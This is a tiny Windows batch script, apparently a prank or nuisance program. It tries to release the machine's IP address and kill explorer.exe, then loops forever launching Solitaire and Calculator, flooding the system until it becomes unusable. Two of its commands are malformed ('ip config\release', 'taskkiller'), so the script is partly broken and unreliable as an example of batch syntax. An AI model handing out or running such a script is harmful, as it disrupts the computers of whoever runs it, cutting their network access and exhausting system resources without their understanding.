ip config\release

@echo off
taskkiller explorer.exe
:main
start sol.exe
start calc.exe
goto :main